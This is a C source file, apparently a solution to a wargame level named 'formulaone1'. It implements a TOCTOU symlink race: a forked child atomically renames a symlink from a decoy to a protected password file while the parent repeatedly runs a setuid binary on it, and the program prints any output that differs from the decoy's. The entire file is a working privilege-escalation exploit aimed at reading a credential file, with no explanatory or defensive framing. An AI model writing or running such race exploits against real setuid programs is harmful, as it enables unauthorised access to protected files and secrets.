/* formulaone1 TOCTOU racer: toggle target between decoy and the password file
   in a tight loop while the parent forks the setuid binary over and over. */
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>

int main(void) {
    char out[512];
    for (long iter = 0; iter < 200000; iter++) {
        unlink("target");
        symlink("decoy", "target");                    // readable by us
        pid_t p = fork();
        if (p == 0) {
            // child: swap to the password file as fast as possible after access()
            symlink("/etc/formulaone_pass/formulaone1", "swap_tmp");
            rename("swap_tmp", "target");              // atomic replace
            _exit(0);
        }
        // parent: run the binary against target
        int fds[2]; pipe(fds);
        pid_t q = fork();
        if (q == 0) {
            dup2(fds[1], 1); close(fds[0]); close(fds[1]);
            execl("/formulaone/formulaone1", "formulaone1", "target", (char*)0);
            _exit(127);
        }
        close(fds[1]);
        int n = 0, t;
        while ((t = read(fds[0], out+n, sizeof(out)-1-n)) > 0) n += t;  // drain to EOF
        close(fds[0]);
        if (n > 0) {
            out[n] = 0;
            if (strstr(out, "readable") == NULL) {     // not the decoy -> the password!
                printf("HIT iter %ld: %s\n", iter, out);
                fflush(stdout);
            }
        }
        waitpid(p, NULL, 0);
        waitpid(q, NULL, 0);
    }
    printf("done\n");
    return 0;
}
